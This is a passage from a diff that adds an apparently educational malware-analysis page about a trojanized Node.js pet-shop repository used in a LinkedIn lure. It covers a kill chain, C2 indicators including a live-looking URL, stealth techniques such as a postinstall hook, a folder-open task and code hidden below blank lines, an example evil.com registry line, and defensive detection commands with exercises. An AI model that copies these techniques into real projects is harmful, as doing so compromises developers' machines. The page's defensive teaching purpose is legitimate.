+  <p>If the C2 server is down, the error is silently logged and the application continues normally. The pet shop works fine. The payment system processes orders. Nobody notices that the bootstrap "utility" failed to phone home. The malware degrades gracefully &mdash; better error handling than most production code.</p>
+</section>
+
+<hr>
+
+<!-- ── Chapter IV ── -->
+<section id="ch4">
+  <h2><span class="ch-num">Chapter IV</span>The Two Hundred Empty Lines</h2>
+  <div class="vector-meta">
+    <span class="vm-vector">Blank Line Obfuscation</span>
+    <span class="vm-file">server/app.js</span>
+    <span class="vm-pr"><a href="https://github.com/zeekay/petshop-of-horrors/pull/3">PR #3</a></span>
+  </div>
+  <p>Here is perhaps the most <em>elegant</em> horror in the collection.</p>
+  <p>After <code>module.exports = app;</code> on line 61, the file doesn't end. It continues. For <strong>two hundred and ten blank lines</strong>. An ocean of whitespace. A void so vast that no editor's scrollbar thumb will betray its presence, no casual review will reach its far shore.</p>
+  <p>And then, at line 272, surfacing from the deep:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> server/app.js:272</div><code><span class="ck">const</span> <span class="cp">errorPayment</span> = <span class="cf">require</span>(<span class="cs">'./controllers/paymentController'</span>);</code></pre>
+
+  <p>A single line of code, invisible to anyone who doesn't scroll past infinity. The blank lines are there for one reason: to exploit the fact that human beings stop reading at <code>module.exports</code>. It's the code equivalent of hiding something under the false bottom of a suitcase.</p>
+
+  <h3>Does This Line Do Anything?</h3>
+  <p>In this case, <code>paymentController.js</code> is actually clean &mdash; it's a legitimate Paytm payment handler. The hidden <code>require()</code> executes the module's top-level code (which just imports dependencies), so it's more of a reconnaissance artifact than a payload. But the <em>technique</em> is what matters for study:</p>
+  <p>&bull; The attacker can put anything below those blank lines<br>
+     &bull; <code>require()</code> executes a module's top-level code as a side effect<br>
+     &bull; If the required module had malicious top-level code, this hidden line would trigger it<br>
+     &bull; The technique works in any file, in any language with similar import semantics</p>
+  <p>This is a documented obfuscation pattern used in real-world attacks. <strong>Always scroll to the end.</strong></p>
+</section>
+
+<hr>
+
+<!-- ── Chapter V ── -->
+<section id="ch5">
+  <h2><span class="ch-num">Chapter V</span>The First Bite</h2>
+  <div class="vector-meta">
+    <span class="vm-vector">npm Lifecycle Script</span>
+    <span class="vm-file">package.json</span>
+    <span class="vm-trigger">npm install</span>
+    <span class="vm-pr"><a href="https://github.com/zeekay/petshop-of-horrors/pull/4">PR #4</a></span>
+  </div>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> package.json</div><code><span class="cs">"postinstall"</span>: <span class="cs">"npm run dev"</span></code></pre>
+
+  <p>One line. The point of entry. The handshake that becomes a bite.</p>
+  <p>Every developer's muscle memory: clone a repo, <code>npm install</code>, wait. Make coffee. Check Slack. But this <code>npm install</code> has a <code>postinstall</code> hook, and that hook runs <code>npm run dev</code>, and <code>dev</code> starts the server with <code>concurrently</code>, and the server calls <code>initAppBootstrap()</code>, and <code>initAppBootstrap()</code> phones home to the C2 server, and by the time your terminal shows <code>PetShop Server running on port 4001</code>, the payload has already executed.</p>
+
+  <h3>The Kill Chain</h3>
+  <ol class="kill-chain">
+    <li><span class="kc-label">Step 1</span><code>npm install</code></li>
+    <li><span class="kc-label">Step 2</span><code>postinstall: "npm run dev"</code></li>
+    <li><span class="kc-label">Step 3</span><code>concurrently "npm run dev:server" "npm run dev:client"</code></li>
+    <li><span class="kc-label">Step 4</span><code>nodemon server/server.js</code> &rarr; <code>require('./app')</code></li>
+    <li><span class="kc-label">Step 5</span><code>initAppBootstrap()</code> &rarr; <code>atob(DEV_API_KEY)</code> &rarr; C2 URL</li>
+    <li><span class="kc-label">Step 6</span><code>axios.get(C2)</code> &rarr; <code>Function.constructor(response.cookies)</code> &rarr; <strong style="color:var(--red)">Full RCE</strong></li>
+  </ol>
+
+  <p><strong>Six layers deep.</strong> Each one looks normal in isolation. Each one is a trap door to the next. The attacker has exploited the principle of <em>composability</em> &mdash; the same principle that makes npm powerful is what makes it dangerous.</p>
+
+  <h3>Why <code>postinstall</code>?</h3>
+  <p>npm lifecycle scripts are the perfect attack surface because:</p>
+  <p>1. <strong>They run automatically.</strong> No <code>--scripts</code> flag needed. No confirmation prompt.<br>
+     2. <strong>They're expected.</strong> Many legitimate packages use <code>postinstall</code> for native compilation, binary downloads, or setup tasks.<br>
+     3. <strong>They run with the user's full permissions.</strong> Not sandboxed. Not restricted.<br>
+     4. <strong>The hook name is buried.</strong> <code>postinstall</code> is one line in a JSON file with dozens of fields. Reviewers focus on <code>dependencies</code>, not <code>scripts</code>.</p>
+
+  <h3>The Ghost of aligned-arrays</h3>
+  <p>In <code>server/server.js</code>, there's a commented-out artifact:</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> server/server.js (fossil)</div><code><span class="cm">// const {jsonifySettings} = require('aligned-arrays');</span>
+<span class="cm">// ...</span>
+<span class="cm">// jsonifySettings("706");</span></code></pre>
+  <p>This is likely a <strong>previous version of the attack</strong> that used a malicious npm package called <code>aligned-arrays</code>. The attacker apparently switched to the <code>.env</code> + bootstrap approach, which is harder to detect. The commented-out code is a fossil &mdash; evidence of the malware's evolution.</p>
+</section>
+
+<hr>
+
+<!-- ── Chapter VI ── -->
+<section id="ch6">
+  <h2><span class="ch-num">Chapter VI</span>The Ghosts in the Walls</h2>
+  <p>Beyond the four primary attack vectors, this specimen contains several secondary indicators of compromise and forensic curiosities:</p>
+
+  <h3>The Foreign Launch Config</h3>
+  <p><code>.vscode/launch.json</code> references an AWS profile <code>flo-ct-flo360</code> and SST (Serverless Stack Toolkit) debugging configurations. This project is a plain Express/React app &mdash; it has no serverless infrastructure whatsoever. The launch config was <strong>copy-pasted from a different project</strong>, which means either:</p>
+  <p>&bull; The attacker is reusing <code>.vscode/</code> configs across multiple malware packages<br>
+     &bull; The attacker compromised project <code>flo-ct-flo360</code> and is weaponizing its configs<br>
+     &bull; The launch config is from the attacker's own development environment (OPSEC failure)</p>
+
+  <h3>The Encoded Campaign ID</h3>
+  <p><code>.repo_name.txt</code> contains UTF-16LE encoded text that decodes to <code>parts-fml8tiqb</code>. This is likely a <strong>campaign identifier</strong> &mdash; a tracking code the attacker uses to identify which malware variant infected which target.</p>
+
+  <h3>The Exposed API Keys</h3>
+  <p><code>server/.env</code> contains a real SparkPost API key, Cloudinary credentials, and Paytm merchant details. These may be stolen from a real project the attacker cloned, the attacker's own test accounts (useful for attribution), or honeypots that log who uses them (a trap within a trap).</p>
+
+  <h3>The Paytm Staging Environment</h3>
+  <p><code>server/controllers/paymentController.js</code> connects to <code>securegw-stage.paytm.in</code> &mdash; Paytm's <em>staging</em> gateway. This confirms the app was never meant to actually process payments. It's scaffolding. Set dressing. A Potemkin village of e-commerce, just convincing enough to lower your guard.</p>
+</section>
+
+<hr>
+
+<!-- ── Epilogue ── -->
+<section id="epilogue">
+  <h2><span class="ch-num">Epilogue</span>The Autopsy Report</h2>
+
+  <h3>Attack Classification</h3>
+  <table>
+    <thead><tr><th>Property</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Type</strong></td><td>Multi-vector supply chain attack</td></tr>
+      <tr><td><strong>Target</strong></td><td>JavaScript/Node.js developers</td></tr>
+      <tr><td><strong>Delivery</strong></td><td>LinkedIn social engineering (fake business owner seeking dev help / targeting job seekers)</td></tr>
+      <tr><td><strong>Persistence</strong></td><td>Multiple redundant execution paths</td></tr>
+      <tr><td><strong>C2 Server</strong></td><td><code style="color:var(--red)">https://purple-lottie-38.tiiny.site/index.json</code></td></tr>
+      <tr><td><strong>C2 Auth</strong></td><td>HTTP header <code>x-secret-key: _</code></td></tr>
+      <tr><td><strong>Payload Delivery</strong></td><td><code>response.data.cookies</code> (JavaScript string)</td></tr>
+      <tr><td><strong>Execution Method</strong></td><td><code>Function.constructor</code> (evades <code>eval</code> detection)</td></tr>
+      <tr><td><strong>Campaign ID</strong></td><td><code>parts-fml8tiqb</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>The Four Horsemen</h3>
+  <div class="horsemen">
+    <div class="card">
+      <span class="card-num">I</span>
+      <h4>VSCode Auto-Run Task</h4>
+      <p><strong>Trigger:</strong> Open folder<br><strong>Stealth:</strong> Silent, invisible, auto-executes<br><a href="https://github.com/zeekay/petshop-of-horrors/pull/1">PR #1</a></p>
+    </div>
+    <div class="card">
+      <span class="card-num">II</span>
+      <h4>Fake Font RCE Dropper</h4>
+      <p><strong>Trigger:</strong> Via Vector 1<br><strong>Stealth:</strong> Disguised as .woff2 font file<br><a href="https://github.com/zeekay/petshop-of-horrors/pull/2">PR #2</a></p>
+    </div>
+    <div class="card">
+      <span class="card-num">III</span>
+      <h4>Bootstrap RCE Backdoor</h4>
+      <p><strong>Trigger:</strong> Server start<br><strong>Stealth:</strong> Base64-encoded C2 in .env<br><a href="https://github.com/zeekay/petshop-of-horrors/pull/3">PR #3</a></p>
+    </div>
+    <div class="card">
+      <span class="card-num">IV</span>
+      <h4>npm Postinstall Hook</h4>
+      <p><strong>Trigger:</strong> npm install<br><strong>Stealth:</strong> 6 layers of indirection<br><a href="https://github.com/zeekay/petshop-of-horrors/pull/4">PR #4</a></p>
+    </div>
+  </div>
+
+  <h3>Complete File Audit</h3>
+  <table>
+    <thead><tr><th>Status</th><th>Files</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td><span class="badge badge-red">Malicious</span></td><td><code>.vscode/tasks.json</code>, <code>settings.json</code></td><td>Auto-run trojan + enabler</td></tr>
+      <tr><td><span class="badge badge-red">Malicious</span></td><td><code>public/fa-solid-400.woff2</code></td><td>JavaScript disguised as font</td></tr>
+      <tr><td><span class="badge badge-red">Malicious</span></td><td><code>server/utils/bootstrap.js</code></td><td>C2 fetch + RCE</td></tr>
+      <tr><td><span class="badge badge-red">Malicious</span></td><td><code>server/app.js</code></td><td>Calls bootstrap + 210 blank line obfuscation</td></tr>
+      <tr><td><span class="badge badge-red">Malicious</span></td><td><code>package.json</code></td><td>postinstall hook</td></tr>
+      <tr><td><span class="badge badge-amber">Suspicious</span></td><td><code>server/.env</code></td><td>Base64 C2 credentials</td></tr>
+      <tr><td><span class="badge badge-amber">Suspicious</span></td><td><code>.repo_name.txt</code></td><td>Campaign tracking ID</td></tr>
+      <tr><td><span class="badge badge-amber">Suspicious</span></td><td><code>.vscode/launch.json</code></td><td>Foreign project config</td></tr>
+      <tr><td><span class="badge badge-amber">Suspicious</span></td><td><code>server/server.js</code></td><td>Fossil: commented-out aligned-arrays</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>server/controllers/*</code></td><td>4 files, all legitimate</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>server/routes/*</code></td><td>4 files, all legitimate</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>server/models/*</code></td><td>31 files, standard Mongoose schemas</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>server/middlewares/*</code></td><td>15 files, all legitimate</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>src/*</code></td><td>React/TypeScript frontend, all legitimate</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td><code>public/index.html</code></td><td>Standard React template</td></tr>
+      <tr><td><span class="badge badge-green">Clean</span></td><td>All image files</td><td>Verified actual images via file(1)</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr>
+
+<!-- ── Appendix A ── -->
+<section id="appendix-a">
+  <h2><span class="ch-num">Appendix A</span>The Bestiary</h2>
+  <p>A catalog of every technique used in this specimen:</p>
+  <table class="technique-table">
+    <thead><tr><th>Technique</th><th>Category</th><th>Purpose</th><th>Detection</th></tr></thead>
+    <tbody>
+      <tr><td>Base64-encoded URLs in .env</td><td>Obfuscation</td><td>Hide C2 address from grep</td><td>Low</td></tr>
+      <tr><td>Function.constructor instead of eval()</td><td>Evasion</td><td>Bypass static analysis</td><td>Medium</td></tr>
+      <tr><td>.woff2 extension on JavaScript</td><td>Disguise</td><td>Evade file-type scanning</td><td>Low</td></tr>
+      <tr><td>runOn: "folderOpen" + hide: true</td><td>Stealth</td><td>Zero-click silent execution</td><td>Medium</td></tr>
+      <tr><td>210 blank lines before hidden code</td><td>Obfuscation</td><td>Push code below scroll horizon</td><td>Low</td></tr>
+      <tr><td>postinstall &rarr; dev &rarr; server &rarr; RCE</td><td>Indirection</td><td>Bury payload in execution chain</td><td>Medium</td></tr>
+      <tr><td>Non-descriptive variables (s, k, v)</td><td>Obfuscation</td><td>Resist comprehension</td><td>Low</td></tr>
+      <tr><td>.data.cookies for payload field</td><td>Camouflage</td><td>Innocent-sounding JSON property</td><td>Medium</td></tr>
+      <tr><td>Cross-platform path handling</td><td>Compatibility</td><td>Works on Win + macOS + Linux</td><td>N/A</td></tr>
+      <tr><td>process.title spoofing</td><td>Stealth</td><td>Disguise malware process</td><td>Medium</td></tr>
+      <tr><td>windowsHide: true</td><td>Stealth</td><td>No visible window on Windows</td><td>Low</td></tr>
+      <tr><td>task.allowAutomaticTasks: true</td><td>Enabler</td><td>Suppress VSCode safety prompt</td><td>Low</td></tr>
+      <tr><td>Commented-out previous payload</td><td>Fossil</td><td>Evidence of malware iteration</td><td>Low</td></tr>
+      <tr><td>UTF-16LE encoded campaign ID</td><td>Tracking</td><td>Identify infection campaigns</td><td>Low</td></tr>
+      <tr><td>Foreign .vscode/launch.json</td><td>OPSEC failure</td><td>Reveals attacker's other targets</td><td>Low</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr>
+
+<!-- ── Appendix B ── -->
+<section id="appendix-b">
+  <h2><span class="ch-num">Appendix B</span>Self-Defense for the Living</h2>
+
+  <h3>Before Opening Any Project</h3>
+  <p><strong>1. Check <code>.vscode/</code> first.</strong> Before opening a folder in VS Code, inspect <code>.vscode/tasks.json</code> and <code>.vscode/settings.json</code> in a plain text editor or terminal. Look for <code>runOn: "folderOpen"</code> and <code>allowAutomaticTasks</code>.</p>
+  <p><strong>2. Read <code>package.json</code> scripts.</strong> Before <code>npm install</code>, check the <code>scripts</code> section for <code>preinstall</code>, <code>install</code>, <code>postinstall</code>, <code>prepare</code>, and <code>prepack</code> hooks. Trace what they execute.</p>
+  <p><strong>3. Run <code>file</code> on non-code files.</strong> Any file that claims to be a binary format but is actually ASCII text is suspect:</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> detection</div><code><span class="cv">$</span> find . -name <span class="cs">"*.woff*"</span> -o -name <span class="cs">"*.otf"</span> -o -name <span class="cs">"*.ttf"</span> | xargs file</code></pre>
+
+  <p><strong>4. Decode base64 in <code>.env</code> files.</strong> Legitimate API keys are random strings. They are not base64-encoded URLs:</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> detection</div><code><span class="cv">$</span> grep -r <span class="cs">"="</span> .env | <span class="ck">while</span> read line; <span class="ck">do</span>
+    echo <span class="cs">"$line"</span> | cut -d= -f2 | tr -d <span class="cs">'"'</span> | base64 -d 2&gt;/dev/null
+  <span class="ck">done</span></code></pre>
+
+  <p><strong>5. Scroll to the end.</strong> Of every file. Or better yet:</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> find trailing hidden code</div><code><span class="cv">$</span> awk <span class="cs">'NF==0{empty++} NF&gt;0{if(empty&gt;20)print FILENAME":"NR": "$0; empty=0}'</span> server/*.js</code></pre>
+
+  <h3>VS Code Settings</h3>
+  <p>Add to your <strong>User</strong> settings (not workspace):</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> settings.json (User)</div><code>{
+  <span class="cs">"security.workspace.trust.enabled"</span>: <span class="cb">true</span>,
+  <span class="cs">"task.allowAutomaticTasks"</span>: <span class="cs">"off"</span>
+}</code></pre>
+  <p><strong>Never</strong> accept workspace settings that override <code>task.allowAutomaticTasks</code>.</p>
+
+  <h3>npm Safety</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> safe install workflow</div><code><span class="cm"># Preview lifecycle scripts before install</span>
+<span class="cv">$</span> npm pack --dry-run 2&gt;/dev/null; cat package.json | jq <span class="cs">'.scripts'</span>
+
+<span class="cm"># Install without running scripts</span>
+<span class="cv">$</span> npm install --ignore-scripts
+
+<span class="cm"># Then manually run only what you trust</span>
+<span class="cv">$</span> npm run build</code></pre>
+
+  <h3>Grep for Evil</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> detection commands</div><code><span class="cm"># Function constructor patterns (RCE via dynamic code execution)</span>
+<span class="cv">$</span> grep -rn <span class="cs">"Function.constructor\|Function(\|new Function"</span> --include=<span class="cs">"*.js"</span> .
+
+<span class="cm"># Base64 decode attempts</span>
+<span class="cv">$</span> grep -rn <span class="cs">"atob\|Buffer.from.*base64"</span> --include=<span class="cs">"*.js"</span> .
+
+<span class="cm"># Process spawning</span>
+<span class="cv">$</span> grep -rn <span class="cs">"child_process\|execSync\|exec("</span> --include=<span class="cs">"*.js"</span> .
+
+<span class="cm"># Dynamic require (loading modules from variables)</span>
+<span class="cv">$</span> grep -rn <span class="cs">"require(\s*[^'\"]"</span> --include=<span class="cs">"*.js"</span> .</code></pre>
+</section>
+
+<hr>
+
+<!-- ── Appendix C ── -->
+<section id="appendix-c">
+  <h2><span class="ch-num">Appendix C</span>Beyond This Specimen</h2>
+  <p>This pet shop used four attack vectors. The real world has many more.</p>
+
+  <h3>npm / Node.js Attack Surface</h3>
+  <table>
+    <thead><tr><th>Vector</th><th>Description</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Typosquatting</strong></td><td>Packages with similar names</td><td><code>lodahs</code> instead of <code>lodash</code></td></tr>
+      <tr><td><strong>Dependency confusion</strong></td><td>Public packages matching internal names</td><td><code>@company/internal-lib</code> on public npm</td></tr>
+      <tr><td><strong>Install scripts in deps</strong></td><td>Malicious hooks in transitive deps</td><td>Hidden 5 levels deep in dep tree</td></tr>
+      <tr><td><strong>Prototype pollution</strong></td><td>Manipulating Object.prototype</td><td><code>__proto__</code> payloads in JSON</td></tr>
+      <tr><td><strong>Malicious .bin/ scripts</strong></td><td>Scripts that shadow system commands</td><td><code>node_modules/.bin/git</code></td></tr>
+      <tr><td><strong>Lock file manipulation</strong></td><td>Lock file points to different registry</td><td>Integrity hash mismatch</td></tr>
+      <tr><td><strong>.npmrc injection</strong></td><td>Redirecting to attacker's registry</td><td><code>registry=https://evil.com</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>IDE Attack Surface</h3>
+  <table>
+    <thead><tr><th>Vector</th><th>Description</th><th>Affected</th></tr></thead>
+    <tbody>
+      <tr><td><strong>VSCode tasks</strong></td><td>Auto-run shell commands on folder open</td><td>VS Code</td></tr>
+      <tr><td><strong>VSCode extensions</strong></td><td>Recommend malicious extensions</td><td>VS Code</td></tr>
+      <tr><td><strong>.devcontainer/</strong></td><td>Docker configs that run arbitrary commands</td><td>VS Code, Codespaces</td></tr>
+      <tr><td><strong>JetBrains run configs</strong></td><td>Arbitrary commands in .idea/</td><td>IntelliJ, WebStorm</td></tr>
+      <tr><td><strong>Vim modelines</strong></td><td>Directives in comments that execute</td><td>Vim/Neovim</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Git Attack Surface</h3>
+  <table>
+    <thead><tr><th>Vector</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Git hooks</strong></td><td>Scripts run on commit, push, checkout, merge</td></tr>
+      <tr><td><strong>.gitconfig includes</strong></td><td>Override global settings via local config</td></tr>
+      <tr><td><strong>.gitattributes filters</strong></td><td>Custom clean/smudge filters execute commands</td></tr>
+      <tr><td><strong>Submodule URLs</strong></td><td>.gitmodules pointing to malicious repos</td></tr>
+      <tr><td><strong>Git LFS</strong></td><td>.lfsconfig pointing to attacker-controlled server</td></tr>
+    </tbody>
+  </table>
+
+  <h3>CI/CD &amp; Build Tool Attack Surface</h3>
+  <table>
+    <thead><tr><th>Vector</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td><strong>GitHub Actions in PRs</strong></td><td>pull_request_target runs attacker's code with secrets</td></tr>
+      <tr><td><strong>Makefile targets</strong></td><td>make install running arbitrary shell commands</td></tr>
+      <tr><td><strong>Dockerfile RUN</strong></td><td>Commands execute during docker build</td></tr>
+      <tr><td><strong>Webpack/Vite/Babel plugins</strong></td><td>Arbitrary code at build time</td></tr>
+      <tr><td><strong>ESLint/PostCSS plugins</strong></td><td>Arbitrary code via config files</td></tr>
+      <tr><td><strong>Jest transforms</strong></td><td>Custom transformers on every test run</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr>
+
+<!-- ── Appendix D ── -->
+<section id="appendix-d">
+  <h2><span class="ch-num">Appendix D</span>Classroom Exercises</h2>
+
+  <h3>Exercise 1: Detection (Beginner)</h3>
+  <p>Clone this repository. Without reading this README, can you identify all four attack vectors using only command-line tools? Time yourself.</p>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> start here</div><code><span class="cv">$</span> git clone https://github.com/zeekay/petshop-of-horrors
+<span class="cv">$</span> cd petshop-of-horrors
+<span class="cm"># Your investigation starts here</span></code></pre>
+  <p><strong>Hints:</strong> Use <code>file</code>, <code>grep</code>, <code>wc -l</code>, <code>base64 -d</code>, and read <code>.vscode/</code> configs.</p>
+
+  <h3>Exercise 2: Trace the Kill Chain (Intermediate)</h3>
+  <p>Starting from <code>npm install</code>, trace the complete execution path to remote code execution. Document every file touched, every function called, and every network request made. Draw the kill chain as a diagram.</p>
+
+  <h3>Exercise 3: Write Detection Rules (Intermediate)</h3>
+  <p>Write a shell script or Python tool that can detect each of the four attack vectors in <em>any</em> Node.js project. Test it against this repository and against a known-clean project.</p>
+  <p>Consider: What's the false positive rate? Can the attacker easily evade your detection? What's the performance cost of scanning large monorepos?</p>
+
+  <h3>Exercise 4: Attribution (Advanced)</h3>
+  <p>Using only the artifacts in this repository, what can you determine about the attacker? Check file timestamps for timezone hints. Investigate <code>launch.json</code> for other targets. Trace the tiiny.site URL. Research the campaign ID <code>parts-fml8tiqb</code>.</p>
+
+  <h3>Exercise 5: Evolution (Advanced)</h3>
+  <p>The commented-out <code>aligned-arrays</code> / <code>jsonifySettings</code> code in <code>server.js</code> is a fossil. Research npm supply chain attacks that use malicious packages with legitimate-sounding names. Compare the bootstrap.js approach in terms of detection difficulty, payload flexibility, operational security, and persistence.</p>
+
+  <h3>Exercise 6: Defense Architecture (Expert)</h3>
+  <p>Design a CI/CD pipeline that would catch this attack before it reaches a developer's machine. Consider pre-clone scanning, static analysis, runtime sandboxing for <code>npm install</code>, network monitoring for C2 callbacks, and continuous package monitoring.</p>
+</section>
+
+<hr>
+
+<!-- ── Footer ── -->
+<footer>
+  <span class="paw">&#128062;&#128298;</span>
+  Maintained by <a href="https://hanzo.ai">Hanzo AI</a>. Discovered, dissected, and documented February 2026.<br>
+  <em>No pets were harmed in the making of this autopsy. The malware, however, is very dead.</em><br><br>
+  <a href="https://github.com/zeekay/petshop-of-horrors">View on GitHub</a>
+</footer>
+
+</main>
+</div>
+
+<script>
+(function(){
+  // ── Character rain on hero canvas ──
+  const canvas = document.getElementById('rain');
+  const ctx = canvas.getContext('2d');
+  let cols, drops;
+  const chars = '01{}[]();:=><./\\|!@#$%^&*npm require eval Function';
+
+  function initRain(){
+    canvas.width = canvas.offsetWidth;
+    canvas.height = canvas.offsetHeight;
+    const sz = 14;
+    cols = Math.floor(canvas.width / sz);
+    drops = Array(cols).fill(1);
+  }
+
+  function drawRain(){
+    ctx.fillStyle = 'rgba(10,10,15,0.06)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#33ff8833';
+    ctx.font = '13px monospace';
+    for(let i = 0; i < cols; i++){
+      const ch = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillStyle = Math.random() > 0.96 ? '#ff224488' : '#33ff8822';
+      ctx.fillText(ch, i * 14, drops[i] * 14);
+      if(drops[i] * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+
+  initRain();
+  window.addEventListener('resize', initRain);
+  setInterval(drawRain, 50);
+
+  // ── Sidebar + mobile nav intersection observer ──
+  const sections = document.querySelectorAll('section[id]');
+  const sideLinks = document.querySelectorAll('.sidebar a, .mobile-menu a');
+
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if(e.isIntersecting){
+        sideLinks.forEach(a => {
+          a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id);
+        });
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+
+  sections.forEach(s => obs.observe(s));
+
+  // ── Mobile menu toggle ──
+  const btn = document.getElementById('menu-btn');
+  const menu = document.getElementById('mobile-menu');
+  btn.addEventListener('click', () => menu.classList.toggle('open'));
+  menu.querySelectorAll('a').forEach(a => {
+    a.addEventListener('click', () => menu.classList.remove('open'));
+  });
+})();
+</script>
+</body>
+</html>
